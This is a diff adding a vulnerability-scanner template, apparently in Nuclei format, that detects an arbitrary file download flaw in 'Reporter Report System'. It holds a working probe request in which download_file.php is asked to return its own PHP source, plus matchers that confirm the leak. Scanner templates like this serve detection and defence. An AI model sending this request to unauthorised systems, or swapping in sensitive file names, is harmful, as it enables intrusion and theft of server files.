@@ -1,0 +1,27 @@
+id: poc-yaml-reporter-report-system-anyfile-download
+info:
+  name: Reporter Report System Any File Download Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/view/action/download_file.php?filename=download_file.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<?php"
+        part: body
+      - type: word
+        words:
+          - "filename="
+        part: body
+      - type: word
+        words:
+          - "application/octet-stream"
+        part: header
